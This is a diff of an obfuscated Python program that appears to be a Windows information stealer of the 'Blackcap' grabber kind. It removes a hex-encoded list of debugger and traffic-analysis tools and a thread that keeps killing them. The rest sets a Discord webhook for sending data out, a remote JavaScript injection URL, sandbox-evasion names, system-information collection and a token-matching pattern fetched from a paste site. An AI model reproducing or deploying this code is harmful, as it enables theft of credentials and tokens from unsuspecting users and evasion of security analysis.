@@ -1,312 +1,3 @@
-class IIlIlIIllIIlIlII:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.llIIlIIlIlIlllIl()
-        IIIIIIIllIllIIII.IIIIIlllllIlIIIIIIl()
-        IIIIIIIllIllIIII.IlIIllIlllIIIllll()
-        IIIIIIIllIllIIII.IIlllIIIIIllIlIl()
-        IIIIIIIllIllIIII.IlIlIIIIIlIIIIII()
-        IIIIIIIllIllIIII.lIIlIIIlIIIIlIlllllI()
-        IIIIIIIllIllIIII.llllllIIIlI()
-        IIIIIIIllIllIIII.lIlIIlIll()
-        IIIIIIIllIllIIII.lIlIIIIIIII()
-        IIIIIIIllIllIIII.IIlIlIll()
-        IIIIIIIllIllIIII.lIIllllIIIIII()
-        IIIIIIIllIllIIII.IllllllIlI()
-        IIIIIIIllIllIIII.lIIIlllllIIIlIIlIIII()
-    def llIIlIIlIlIlllIl(IIIIIIIllIllIIII, lIIIlIllIllII, IIIIlIllII, lllIlllllI, lIIIllllllIIIIIlIIll, llllIlIIIlIIllIlIll, llllIllIl):
-        return IIIIIIIllIllIIII.IIlllIIIIIllIlIl()
-    def IIIIIlllllIlIIIIIIl(IIIIIIIllIllIIII, lIIIlIllI, lIIllIIIllIlIllll, lIlllIlllIIII, IIlllIIIlIllIIlllll, IllIIlIlllIIlIllI, lIIllllIIIIl, llIIlIllIIIlllIIlI):
-        return IIIIIIIllIllIIII.IIIIIlllllIlIIIIIIl()
-    def IlIIllIlllIIIllll(IIIIIIIllIllIIII, lIIIlIIIllIllII, llIlIlIIIlIIllI):
-        return IIIIIIIllIllIIII.IIIIIlllllIlIIIIIIl()
-    def IIlllIIIIIllIlIl(IIIIIIIllIllIIII, lIIlIlII, IlIlIIlIIll, IlIlIllllllIlIllII, IIlIIIIl, lIllIlllIIIllIllI):
-        return IIIIIIIllIllIIII.IIlllIIIIIllIlIl()
-    def IlIlIIIIIlIIIIII(IIIIIIIllIllIIII, llIIIIllIIIllIIllIl, llIllIIl, IlIlIIllIIlIll, IlIlIlIlIIlIIllI):
-        return IIIIIIIllIllIIII.lIIIlllllIIIlIIlIIII()
-    def lIIlIIIlIIIIlIlllllI(IIIIIIIllIllIIII, IllllllllllllIlIIIl, IIIlIlIlI):
-        return IIIIIIIllIllIIII.IllllllIlI()
-    def llllllIIIlI(IIIIIIIllIllIIII, IIlllIllIlIIllIlIl, lllIllll, lllllllIlIIllI):
-        return IIIIIIIllIllIIII.lIlIIlIll()
-    def lIlIIlIll(IIIIIIIllIllIIII, lllIlIIllIl):
-        return IIIIIIIllIllIIII.llllllIIIlI()
-    def lIlIIIIIIII(IIIIIIIllIllIIII, IlIIIlIllIlllIIlllIl, lIIlllIllIIII, IIlllIllIlI, llllIllI, IlIlIlIlIIlI, IllIIIIIIIIIIllIIl):
-        return IIIIIIIllIllIIII.IlIIllIlllIIIllll()
-    def IIlIlIll(IIIIIIIllIllIIII, llIlIlIl, llllllIllIIl, IIlIIIll, IIlIlIIlIII):
-        return IIIIIIIllIllIIII.IIIIIlllllIlIIIIIIl()
-    def lIIllllIIIIII(IIIIIIIllIllIIII, lllIIlIIIlIIIII, lIIIlllIllllllII, IIlIlIlIIlllIIIlIII):
-        return IIIIIIIllIllIIII.IIlIlIll()
-    def IllllllIlI(IIIIIIIllIllIIII, IIIllIIlI):
-        return IIIIIIIllIllIIII.lIlIIIIIIII()
-    def lIIIlllllIIIlIIlIIII(IIIIIIIllIllIIII, IIIIIIIIllI):
-        return IIIIIIIllIllIIII.IIlllIIIIIllIlIl()
-class llIIIIlIIIllIlIlllll:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.lllIlIllIIIl()
-        IIIIIIIllIllIIII.IIlIlIllIl()
-        IIIIIIIllIllIIII.IllllIIlI()
-        IIIIIIIllIllIIII.IIlllIlIl()
-        IIIIIIIllIllIIII.llIlIIIIIIlllIIII()
-        IIIIIIIllIllIIII.llIllIIIllIIl()
-        IIIIIIIllIllIIII.lIlIIIIlIIlIIl()
-        IIIIIIIllIllIIII.llIlllIllIlIIIlIll()
-        IIIIIIIllIllIIII.llllIIIlIIllllII()
-    def lllIlIllIIIl(IIIIIIIllIllIIII, IlllIlIlIIIIIl, lllIlllIlIlIIIIlll):
-        return IIIIIIIllIllIIII.lIlIIIIlIIlIIl()
-    def IIlIlIllIl(IIIIIIIllIllIIII, IlIIIlIlllI, IlIlIIIllIIII, IllIllIIllIIlIlll, lIllllllII, IlIlIIlll):
-        return IIIIIIIllIllIIII.llllIIIlIIllllII()
-    def IllllIIlI(IIIIIIIllIllIIII, lIlIlllIllIIIlIII, llIIllIlI, IlIllIlIIIIIlll, llIlIlIlllIIllIlIl, IlIIIlIlIllIIlI, IllIIIllIIIlIIIlIl, IIIIlIlIlllIl):
-        return IIIIIIIllIllIIII.IIlIlIllIl()
-    def IIlllIlIl(IIIIIIIllIllIIII, lIlIIlllIIIIIllIlIll, lIlIIIIll):
-        return IIIIIIIllIllIIII.IIlllIlIl()
-    def llIlIIIIIIlllIIII(IIIIIIIllIllIIII, lIIIIllIIlllllI, IIllllllIIIlIlI, IIIIllIlIIIIIlI, IlIlIIlllIIllIlIIII, IlllIIllII):
-        return IIIIIIIllIllIIII.IIlIlIllIl()
-    def llIllIIIllIIl(IIIIIIIllIllIIII, lIllIlIIIIl, IlIIlIIIllIIlII, llllIlllIlll, lIllIIIlllIll, lIllIIlIllIllIlII, IIlIlIIlIIIlIIIlll):
-        return IIIIIIIllIllIIII.IIlllIlIl()
-    def lIlIIIIlIIlIIl(IIIIIIIllIllIIII, IlllIlIllIIIIlI, lllllIlllIlII, llIllIlllIIlllIl, IlIlIIIIIIIIlllIIlll):
-        return IIIIIIIllIllIIII.llIlIIIIIIlllIIII()
-    def llIlllIllIlIIIlIll(IIIIIIIllIllIIII, IIIIIllIlllIlI, IIIIllIllllIl, IIIIIlIlII, IlllllIllIl):
-        return IIIIIIIllIllIIII.IIlIlIllIl()
-    def llllIIIlIIllllII(IIIIIIIllIllIIII, IIlIlIlIIIlllIII, IIIllllIllllII):
-        return IIIIIIIllIllIIII.llllIIIlIIllllII()
-class IlIIIllIIlllIlIll:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.lIIlllIlllllIIl()
-        IIIIIIIllIllIIII.IlIlIIIIIIIIlllIIl()
-        IIIIIIIllIllIIII.IIIlIlIIlIIlIIllII()
-        IIIIIIIllIllIIII.llIIIllll()
-        IIIIIIIllIllIIII.IIlllllIllllIIllllI()
-        IIIIIIIllIllIIII.llllIIlIlIlIl()
-        IIIIIIIllIllIIII.IllIlllIIIlllIl()
-    def lIIlllIlllllIIl(IIIIIIIllIllIIII, lllIlIlIIlIIIlIll):
-        return IIIIIIIllIllIIII.IlIlIIIIIIIIlllIIl()
-    def IlIlIIIIIIIIlllIIl(IIIIIIIllIllIIII, IllIlIIlllIIIlIIl, IlIIlIlIllIllllI, IIIlIlIlIIlIl, IIIllIlIIlIllIlIl, llIIIIlIIIIlll, IIIIlIIllIIlI, lIIlIIIIllIllIIlIllI):
-        return IIIIIIIllIllIIII.IllIlllIIIlllIl()
-    def IIIlIlIIlIIlIIllII(IIIIIIIllIllIIII, lIlIIIIIIIllIlII, lIlIIllIlllIIIIlIIl):
-        return IIIIIIIllIllIIII.IlIlIIIIIIIIlllIIl()
-    def llIIIllll(IIIIIIIllIllIIII, IIIlIIlIIllIIl, lllIIlllIIllII):
-        return IIIIIIIllIllIIII.lIIlllIlllllIIl()
-    def IIlllllIllllIIllllI(IIIIIIIllIllIIII, lIlllllIllIIll, lIlIlIlIllI):
-        return IIIIIIIllIllIIII.llllIIlIlIlIl()
-    def llllIIlIlIlIl(IIIIIIIllIllIIII, IIlIIIllIIl, lllIIlIIlI):
-        return IIIIIIIllIllIIII.llllIIlIlIlIl()
-    def IllIlllIIIlllIl(IIIIIIIllIllIIII, IlIIIIIIlllIIllll, llIIIlIlIIllIIlIlll, lIIIllIlllllIlIlIIl, IIlIlIIIIlIllI, IIIllIIIlIIlIl, lIlIlllllIIIlIIlII, IIllIIIllllIlI):
-        return IIIIIIIllIllIIII.llIIIllll()
-class llIllIIlIIlIllIIII:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.lIlIlIllIlIIlllIlI()
-        IIIIIIIllIllIIII.IIllIlIlllIIlIIlIll()
-        IIIIIIIllIllIIII.lIllIIIlIlIllIIIIIlI()
-        IIIIIIIllIllIIII.lIIllIlllllI()
-        IIIIIIIllIllIIII.IlIIlIIlIlllIllllIll()
-        IIIIIIIllIllIIII.llllIlIlIlIlllIIIllI()
-        IIIIIIIllIllIIII.IlIllIIIlII()
-        IIIIIIIllIllIIII.lIIlllIlllllIl()
-        IIIIIIIllIllIIII.llIIlIIlI()
-        IIIIIIIllIllIIII.IlIIlIlIIIIlIlIIll()
-        IIIIIIIllIllIIII.lIlIllllIIl()
-        IIIIIIIllIllIIII.llllIIlIllIl()
-        IIIIIIIllIllIIII.lllIlIIlIIIlI()
-        IIIIIIIllIllIIII.IIlIIlII()
-    def lIlIlIllIlIIlllIlI(IIIIIIIllIllIIII, IlIllIIIlll, lllIllIll, IIlllIIlllllIIlIll):
-        return IIIIIIIllIllIIII.lIlIllllIIl()
-    def IIllIlIlllIIlIIlIll(IIIIIIIllIllIIII, llIlIIllllIIll, lllllIll, IlIlIIlIlI):
-        return IIIIIIIllIllIIII.llllIIlIllIl()
-    def lIllIIIlIlIllIIIIIlI(IIIIIIIllIllIIII, lIIIlllIlIlII, lIlIIlllIlllI, llIlIlIIIIIlllllllIl, lIlIIIIIIIIllIIlllI):
-        return IIIIIIIllIllIIII.IlIllIIIlII()
-    def lIIllIlllllI(IIIIIIIllIllIIII, IIIIllII, IllIllllIIlIlIIlllII, IlllIlIIIIIlllllIl):
-        return IIIIIIIllIllIIII.IlIIlIIlIlllIllllIll()
-    def IlIIlIIlIlllIllllIll(IIIIIIIllIllIIII, llIlIlIlllllIIll, lllIIIIIIlIlII, lIIIllIllllIllIlIl, lIIlIIlIIl, IIIllIIllIlIIII, lIIIIIIlllllIlIlll):
-        return IIIIIIIllIllIIII.IlIIlIlIIIIlIlIIll()
-    def llllIlIlIlIlllIIIllI(IIIIIIIllIllIIII, IIlllllllIlIIIIllI, llllIlIIlIIlIlIIIIl, llIIIllIllII, IIIIIlIlIIIlIlII, lllIllllllII):
-        return IIIIIIIllIllIIII.IlIllIIIlII()
-    def IlIllIIIlII(IIIIIIIllIllIIII, IlIllIIIl, IIIllIlIllIlI, lIlIIIIlllllIIIII, IIIllllIIIlllIIllIIl, IIlIIllIIIlIl):
-        return IIIIIIIllIllIIII.IlIIlIIlIlllIllllIll()
-    def lIIlllIlllllIl(IIIIIIIllIllIIII, IllIIIIII, IIlIlIIIlllIlIIl):
-        return IIIIIIIllIllIIII.IIlIIlII()
-    def llIIlIIlI(IIIIIIIllIllIIII, IIlIlIIllIIlIllIlI, lIIlIIlIl, llIllIII, llIIIIlIlIlII, llllIlIlIlIII, lIlIIlIlII):
-        return IIIIIIIllIllIIII.lIIllIlllllI()
-    def IlIIlIlIIIIlIlIIll(IIIIIIIllIllIIII, lllllllIllI, lllIIIIIl, lIIIlIIIllll):
-        return IIIIIIIllIllIIII.llllIlIlIlIlllIIIllI()
-    def lIlIllllIIl(IIIIIIIllIllIIII, IIIIIllllllIIIlII, IlIIlIIlllllIllI, llllIlIIlIIlIlI):
-        return IIIIIIIllIllIIII.IIlIIlII()
-    def llllIIlIllIl(IIIIIIIllIllIIII, lllIlllIlIIlllII, IIIIIIIIIlllIllllII, lllllIllIIllIlIl):
-        return IIIIIIIllIllIIII.IlIIlIIlIlllIllllIll()
-    def lllIlIIlIIIlI(IIIIIIIllIllIIII, IlIlllll, llIIlIlIllIIII, lIIlllIIlIlIlIll, IIIIIllIIIIIIIIIIII):
-        return IIIIIIIllIllIIII.IlIllIIIlII()
-    def IIlIIlII(IIIIIIIllIllIIII, IlIIllIlIIIIIIll, IllIllIlIIIIll, llIlIlIlIIl, IIlIlIIllIlIllllIlll, IIllllllI, lIIIlIIlIl):
-        return IIIIIIIllIllIIII.IIlIIlII()
-class lIIllIllIIl:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.IIIIIllIIIlIIIIllI()
-        IIIIIIIllIllIIII.IllllIIlII()
-        IIIIIIIllIllIIII.lIIIlIIIll()
-        IIIIIIIllIllIIII.IllllIlllIIII()
-        IIIIIIIllIllIIII.IIlIllIIIlIlllllll()
-        IIIIIIIllIllIIII.llIIIllII()
-        IIIIIIIllIllIIII.llIllIllIll()
-        IIIIIIIllIllIIII.lIllIIllIl()
-        IIIIIIIllIllIIII.llIlllIllIll()
-        IIIIIIIllIllIIII.lIIIllII()
-        IIIIIIIllIllIIII.lIIIlIll()
-    def IIIIIllIIIlIIIIllI(IIIIIIIllIllIIII, llIlIlllIIlIIlIll, IlllIIIlIIllI, lIIlIIllIlIIlIlIIl, lllIlllIllIlIIIlllII, IllllIIIlIIlllIIIIlI):
-        return IIIIIIIllIllIIII.lIllIIllIl()
-    def IllllIIlII(IIIIIIIllIllIIII, lIlIIIlIllIIl, IllIlIlIll, IlllIIIIllIIlI, IlIlIlIlIIllllIl, IIIlIlllllIlII):
-        return IIIIIIIllIllIIII.lIllIIllIl()
-    def lIIIlIIIll(IIIIIIIllIllIIII, lIIllIllllIIll, lIllIIlllIIllllIII, IlIIIlIIlII, IlIIIIIIlllIIIlI, lIlIlIIlIllIlllll, lIIIIIlllIIIlIllllI):
-        return IIIIIIIllIllIIII.lIIIllII()
-    def IllllIlllIIII(IIIIIIIllIllIIII, lIIllIIlllllII, lIIIlIIllIII, llllIlIIlIIlIllIIII, lllIIIIIllIlI, lIlIIllIllllIll, IlIllllllIIIIlIIlIlI, lIIlllllIllI):
-        return IIIIIIIllIllIIII.IIIIIllIIIlIIIIllI()
-    def IIlIllIIIlIlllllll(IIIIIIIllIllIIII, lIIllIlI, IlIlIIllllII, lllIlIIlllll, llIIlIlII):
-        return IIIIIIIllIllIIII.lIIIllII()
-    def llIIIllII(IIIIIIIllIllIIII, lllIIlIIlIIllllI, lllIIIlIlllIIIlIlI, llllllIl):
-        return IIIIIIIllIllIIII.llIIIllII()
-    def llIllIllIll(IIIIIIIllIllIIII, llllIllIIIlIllIIIl, IIIIIIIIll, IllllIIIIIlIllI, lIlIIIIlIllIIlllIII):
-        return IIIIIIIllIllIIII.IIlIllIIIlIlllllll()
-    def lIllIIllIl(IIIIIIIllIllIIII, IIlIIllllI):
-        return IIIIIIIllIllIIII.lIllIIllIl()
-    def llIlllIllIll(IIIIIIIllIllIIII, IllIlIIlIl, lIIIIllllll):
-        return IIIIIIIllIllIIII.lIIIlIll()
-    def lIIIllII(IIIIIIIllIllIIII, IIlIIllI, IllIIIIlIIllII, lIllllIllI, IIIlIllI, IIlIIllIIlIllllIIIl):
-        return IIIIIIIllIllIIII.lIllIIllIl()
-    def lIIIlIll(IIIIIIIllIllIIII, IlIlllIllIlllI, IIIIlIIlIlIllllllII, lllIIlIlI, lIIlIlIllIIIIII, lIlllIlIlIIllIIIl, IIllIlllIIIIllllIII):
-        return IIIIIIIllIllIIII.llIlllIllIll()
-import ctypes, sys
-if not ctypes.windll.shell32.IsUserAnAdmin() != 0:
-    print("Please run this program as administrator.")
-    sys.exit(0)
-import binascii, threading, IlllIlIIlIIlIlllll
-try:
-    from psutil import process_iter
-except:
-    import os
-    os.system("pip install psutil")
-lIIIlIIIlllIIllIIl = [
-    '53757370656e64', '50726f67726573732054656c6572696b20466964646c657220576562204465627567676572', '466964646c6572', '57697265736861726b',
-    '64756d70636170', '646e537079', '646e5370792d783836', '6368656174656e67696e652d7838365f3634', '4854545044656275676765725549',
-    '50726f636d6f6e', '50726f636d6f6e3634', '50726f636d6f6e363461', '50726f636573734861636b6572',
-    '783332646267', '783634646267', '446f744e657444617461436f6c6c6563746f723332',
-    '446f744e657444617461436f6c6c6563746f723634', '485454504465627567676572537663', '48545450204465627567676572', '696461', '6964613634', '69646167', '696461673634',
-    '69646177', '696461773634', '69646171', '696461713634', '69646175', '696461753634',
-    '7363796c6c61', '7363796c6c615f783634', '7363796c6c615f783836', '70726f74656374696f6e5f6964',
-    '77696e646267', '7265736861636b6572', '496d706f7274524543', '494d4d554e4954594445425547474552',
-    '4d65676144756d706572', '646973617373656d626c79', '4465627567', '5b435055496d6d756e697479',
-    '4d65676144756d70657220312e3020627920436f6465437261636b6572202f20536e44', '436861726c6573', '636861726c6573', '4f4c4c59444247', '496d706f72745f7265636f6e7374727563746f72',
-    '636f6465637261636b6572', '646534646f74', '696c737079', '67726179776f6c66',
-    '73696d706c65617373656d626c796578706c6f726572', '7836346e657464756d706572', '687864',
-    '7065746f6f6c73', '73696d706c65617373656d626c79', '68747470616e616c797a6572', '687474706465627567', '70726f636573736861636b6572', '6d656d6f727965646974', '6d656d6f7279',
-    '646534646f746d6f64646564', '70726f63657373206861636b6572', '70726f63657373206d6f6e69746f72',
-    '717435636f7265', '696461', '696d6d756e697479', '68747470', '74726166666963',
-    '77697265736861726b', '666964646c6572', '7061636b6574', '6861636b6572', '6465627567', '646e737079', '646f747065656b', '646f747472616365', '70726f6364756d70', '6d616e61676572',
-    '6d656d6f7279', '6e65744c696d6974', '6e65744c696d69746572', '73616e64626f78'
-]
-lIIIlIIIlllIIllIIl = [binascii.unhexlify(lIIllllllIl.encode()).decode() for lIIllllllIl in lIIIlIIIlllIIllIIl]
-def llllIIlIlllIlI():
-    while True:
-        try:
-            for IIIIIllIIlIIll in process_iter():
-                for lIIllllllIl in lIIIlIIIlllIIllIIl:
-                    if lIIllllllIl.lower() in IIIIIllIIlIIll.IllIlIIlIIllIlIIlIl().lower():
-                        IIIIIllIIlIIll.kill()
-        except Exception:
-            pass
-        IlllIlIIlIIlIlllll.sleep(0.5)
-threading.Thread(IIllIIlIlllII=llllIIlIlllIlI, daemon=True).start()
-class llIlllllIllIllI:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.IIIIlIllIlllIlIlllIl()
-        IIIIIIIllIllIIII.lIlIlIIllII()
-        IIIIIIIllIllIIII.lllIlIIlllIlIIlIIIIl()
-        IIIIIIIllIllIIII.llIlIlII()
-        IIIIIIIllIllIIII.llIIIIII()
-        IIIIIIIllIllIIII.lIllIlIllIII()
-        IIIIIIIllIllIIII.IlllllIIl()
-    def IIIIlIllIlllIlIlllIl(IIIIIIIllIllIIII, IIllIIIIIllIllIl, lIIIllIIll, IIIlIIlIIlIIl, lIIIIlIIllII, IlIIlIllIlIllIIlI):
-        return IIIIIIIllIllIIII.IIIIlIllIlllIlIlllIl()
-    def lIlIlIIllII(IIIIIIIllIllIIII, IIlllllIIlIl, IlIIIIIlllIIlIIlllI, lIIIIlIlIllIl):
-        return IIIIIIIllIllIIII.IIIIlIllIlllIlIlllIl()
-    def lllIlIIlllIlIIlIIIIl(IIIIIIIllIllIIII, lIIIllIIIIIl, IlIlIIllIlIIIlIIllI, lllIllIIIlllIl, IlIllIlIl, lllIlIlIIIIl, IIlIlIlIIlllIlIl, llIIlIlIIl):
-        return IIIIIIIllIllIIII.lllIlIIlllIlIIlIIIIl()
-    def llIlIlII(IIIIIIIllIllIIII, llllllIIIIIl, llllIlIllIl, lllIllIIIlllllllIlII, lIIllIIlllIll, llIIllllllIllllllII):
-        return IIIIIIIllIllIIII.lllIlIIlllIlIIlIIIIl()
-    def llIIIIII(IIIIIIIllIllIIII, IIlIllIIlIIIlIIlIlll, lIIlIlIIIllIII, IIIIllIllIIIllIIIll, IllIlIIlIlIIlllIlI):
-        return IIIIIIIllIllIIII.IlllllIIl()
-    def lIllIlIllIII(IIIIIIIllIllIIII, IIlIllIIIIl, IlIllIlIIIIl, lIllIIlllIlllllI, lIlllIIlll, IllllllIIIIIlIll, lIlIIlIlIIllIlllIlI, lIIlllIIllIlI):
-        return IIIIIIIllIllIIII.llIIIIII()
-    def IlllllIIl(IIIIIIIllIllIIII, IlllIIIll, IlIIIIlIllIIllIllIl, IIIlIIII, IlIIIIlllllIIllIl, IllIIllllllllllIll, IIIlIllllIIllllIII):
-        return IIIIIIIllIllIIII.llIIIIII()
-class llllIIlIlIIlI:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.lllllIIllIlI()
-        IIIIIIIllIllIIII.lllIIIIllIII()
-        IIIIIIIllIllIIII.lllIlllIlI()
-        IIIIIIIllIllIIII.IlIIlIlIII()
-        IIIIIIIllIllIIII.llIllIIIIIIIIlIl()
-        IIIIIIIllIllIIII.IIIIIIIIlll()
-        IIIIIIIllIllIIII.IIlIIIIIlII()
-        IIIIIIIllIllIIII.lllIlllIllIl()
-        IIIIIIIllIllIIII.IIIlllIlIllIlIllIlII()
-    def lllllIIllIlI(IIIIIIIllIllIIII, IlIlllIlIIIIIllIlIlI, lIIlIIIIIlIIllIllIIl, lllllllIIllIIlIllI):
-        return IIIIIIIllIllIIII.lllIlllIlI()
-    def lllIIIIllIII(IIIIIIIllIllIIII, IlIIIIIllIllI, IIlllIlIIIlllIIIllIl, lllllllIIl, lIIIllIlIlll, lllIIlIl, IlIIIIIlIllIlIlII, lllllllIlllIIIl):
-        return IIIIIIIllIllIIII.llIllIIIIIIIIlIl()
-    def lllIlllIlI(IIIIIIIllIllIIII, IlIlIIllII, lIIlllIlIll, IIlIlIlIll, llIIIlIlIIllllllll):
-        return IIIIIIIllIllIIII.lllIIIIllIII()
-    def IlIIlIlIII(IIIIIIIllIllIIII, IIIlllIIlIlI, lIIIIIlIIIlI, IlIlllllllIIIIllIl):
-        return IIIIIIIllIllIIII.lllllIIllIlI()
-    def llIllIIIIIIIIlIl(IIIIIIIllIllIIII, IllIlIlIlIIlIlIIIII, IlIlIIIlllllllIlI, lllIIlIIIIl, lIllIlIlIIIIlll, llIlIIlIIIllIlIIl, IlIlllIlIllII, lIllllIIIIlIl):
-        return IIIIIIIllIllIIII.llIllIIIIIIIIlIl()
-    def IIIIIIIIlll(IIIIIIIllIllIIII, IIlIllIl):
-        return IIIIIIIllIllIIII.lllIIIIllIII()
-    def IIlIIIIIlII(IIIIIIIllIllIIII, IIlIllllIlIllIIII, IIlIIlIl, IIIIIIIIlIIlIll, IIlIIlll, lIlIIIIlIlIIllIlll, IlllIllllIll, llIIlIIllIIllllIl):
-        return IIIIIIIllIllIIII.lllIlllIllIl()
-    def lllIlllIllIl(IIIIIIIllIllIIII, IIIIIlIIlll, lIlllIlllIIIIIlIl, lIIIIIlIIllllI, llIIllllIIlIlllIllll, IIlIlIIlllll):
-        return IIIIIIIllIllIIII.lllIIIIllIII()
-    def IIIlllIlIllIlIllIlII(IIIIIIIllIllIIII, lIIIllIlIllIIlIIl, IlllIIIllIlI, llIIIlIlllIllIIlll, IlIIIlIIIllllIIlIlII, IIIIllIIl):
-        return IIIIIIIllIllIIII.lllllIIllIlI()
-class IlIlIIlIIlIllI:
-    def __init__(IIIIIIIllIllIIII):
-        IIIIIIIllIllIIII.lllIlIIlIlllIIll()
-        IIIIIIIllIllIIII.IllIllIIIl()
-        IIIIIIIllIllIIII.lIlllIII()
-        IIIIIIIllIllIIII.llllllIIIl()
-        IIIIIIIllIllIIII.IlIIIlllII()
-        IIIIIIIllIllIIII.llIllllIlllIl()
-        IIIIIIIllIllIIII.IIllllIIlllIIllIlI()
-        IIIIIIIllIllIIII.IIIlIllIlllIl()
-        IIIIIIIllIllIIII.lIllllIIllIllllllll()
-        IIIIIIIllIllIIII.IlIIllllIIIlIIIllIll()
-        IIIIIIIllIllIIII.llIllIll()
-        IIIIIIIllIllIIII.lIlIllIIlIIlIIlI()
-        IIIIIIIllIllIIII.IIIIIllIIlIlIl()
-        IIIIIIIllIllIIII.lIIIIllIIIIIIlI()
-    def lllIlIIlIlllIIll(IIIIIIIllIllIIII, IIlllIlIlII):
-        return IIIIIIIllIllIIII.lIIIIllIIIIIIlI()
-    def IllIllIIIl(IIIIIIIllIllIIII, IIllllIllIIIIIllIl, lllIllllIIIIllIllIll, llIllllllI):
-        return IIIIIIIllIllIIII.llIllllIlllIl()
-    def lIlllIII(IIIIIIIllIllIIII, IlIllIlIlIIIlIlI):
-        return IIIIIIIllIllIIII.llIllllIlllIl()
-    def llllllIIIl(IIIIIIIllIllIIII, lllllIIllllIlIlIl, IlIIIlIIllllIIIIllIl, lIIlIIlllllII, IIIllIIllIlIl, IIIllllIIlIlIIlIIIIl, IlIllIIllIII, IlIIlIIl):
-        return IIIIIIIllIllIIII.lIlIllIIlIIlIIlI()
-    def IlIIIlllII(IIIIIIIllIllIIII, IIIlIIIIIlIlIlIllI, IIIlIlIllIlIIIl, llIIlIllllIlIIlIlII, lIlllllIIllll, IlIIIIlIlII):
-        return IIIIIIIllIllIIII.llIllllIlllIl()
-    def llIllllIlllIl(IIIIIIIllIllIIII, llllIlIIlI, IIllIIllllIlIIIlIlII):
-        return IIIIIIIllIllIIII.IlIIIlllII()
-    def IIllllIIlllIIllIlI(IIIIIIIllIllIIII, IIIIlIIIIIIIllIIII, IIlIlllIlIIlllIlI, IlIIlIlll, IIIIIIIIl, IllIlllIIlllIIl, IllIlIlIlI, lIIIllIlIlllIIIIlI):
-        return IIIIIIIllIllIIII.lIllllIIllIllllllll()
-    def IIIlIllIlllIl(IIIIIIIllIllIIII, lIllIIIllllIIIlIIIII, IIlIIIlIllIl, IIIIIIIlIllIIIllllI, IIIIIllIIllIll):
-        return IIIIIIIllIllIIII.lIlIllIIlIIlIIlI()
-    def lIllllIIllIllllllll(IIIIIIIllIllIIII, lIIIIIlIIIllllllllII, lIIllllIIlIllllI, lIIIlIIIlIIIIIIIll, llIlllIlIllIIllIIll, llIIlIIIlI, IlIIlIlIlII):
-        return IIIIIIIllIllIIII.llllllIIIl()
-    def IlIIllllIIIlIIIllIll(IIIIIIIllIllIIII, llIllIIllIIII, lllllIIIlIIIlllIIl, IllIllllIlIIlllllIl):
-        return IIIIIIIllIllIIII.IlIIIlllII()
-    def llIllIll(IIIIIIIllIllIIII, lllIIllllIII, lIlIlIIIlIlI, IIIlIIlIlIIIIIIIIl, IllIlllIIIIlllIIII, IllIllIllI, llIIlIllllIllI):
-        return IIIIIIIllIllIIII.lIllllIIllIllllllll()
-    def lIlIllIIlIIlIIlI(IIIIIIIllIllIIII, IIlIlllIIllIIlIIIll, IIIIIIIllllIIIIIIIl):
-        return IIIIIIIllIllIIII.lIllllIIllIllllllll()
-    def IIIIIllIIlIlIl(IIIIIIIllIllIIII, IlIlIlIlIIII, IIlllllllIlIllll, lIIIllIlIIIllllIll, lIlIIIIl, lllIIllIIlllIlllI, IIlIlIIlIIIllI):
-        return IIIIIIIllIllIIII.llIllIll()
-    def lIIIIllIIIIIIlI(IIIIIIIllIllIIII, IIllIlIIIIllIllIlI, IllIIIIIlllIlllIIIll, lllIllIlllIlIl, IlIIlIIIllIllIIllII, IIllIllIlllIllIlI, IIIlIlIIl, IIIIIllllII):
-        return IIIIIIIllIllIIII.lIIIIllIIIIIIlI()
 import asyncio
 import json
 import ntpath
@@ -324,7 +15,7 @@ import psutil
 import base64
 import requests
 import ctypes
-import IlllIlIIlIIlIlllll
+import lIlllIlIIII
 import pyperclip
 import win32gui
 import win32con
@@ -340,14 +31,14 @@ from json import loads, dumps
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from Crypto.Cipher import AES
 from PIL import ImageGrab
-from win32crypt import llIIllIlIllIIlIIll
+from win32crypt import lIIIlllllI
 import urllib.request
-IllIIlIIIIllIlllIll = os.getenv('LOCALAPPDATA')
-IIIllIIllIlllIlllII = os.getenv('APPDATA')
-IllIIlIllIllIIII = os.getenv("TEMP")
-lIlIlIlIl = [];
-IlIIlllIIllIIllI = {
-    'yourwebhookurl': "https://discord.com/api/webhooks/1118217510899175564/C5F7XiqilQEMU-fccrqcQoAiqZiyGj4Z8fj_tBSZcupgIovWFuHrKk67woNsOyzsih-d",
+IlllIIlIIlllI = os.getenv('LOCALAPPDATA')
+IllllllI = os.getenv('APPDATA')
+lIIllIlIlIIIIIlIII = os.getenv("TEMP")
+lIllIlIIIIlIlIIIIl = [];
+IllllllllIIlIIlll = {
+    'yourwebhookurl': "https://discord.com/api/webhooks/1119333985923903568/K9Z71JGoPx-phMFqnAMKIwNi0Cp1AdItiranBc2wFbO17dsSA7fIQe8OAO8gaFD-LHVl",
     'blackcap_inject_url': "https://raw.githubusercontent.com/toinfinityandbeyonddd/inject/main/index.js",
     'hide': 'yes',
     'ping': 'yes',
@@ -399,249 +90,249 @@ IlIIlllIIllIIllI = {
         "joeboxserver"
     ]
 }
-lIlllIIIlIlllIIIlIIl = os.getlogin()
-IIIlIlIllIIIlIIIlII = os.getenv("COMPUTERNAME")
-IllIllIIIlll = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
-IIlllIIl = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
-IIIlIllII = 'https://paste.bingner.com/paste/jkgxr/raw'
-IlIIIllIlIIIlIlIIll = requests.get(IIIlIllII) 
-IlIllIIIII = IIlllIIlIlIlI"[\w-]{24}\." + IlIIIllIlIIIlIlIIll.text
-class lIlIIIllIII(object):
+lIIllIllII = os.getlogin()
+IIIIlIIIIIlllIIlIlI = os.getenv("COMPUTERNAME")
+llllIlll = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
+llIIIlIIlIlIlIIIIlll = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
+llllIlIlIllllII = 'https://paste.bingner.com/paste/jkgxr/raw'
+IIllIIIllll = requests.get(llllIlIlIllllII) 
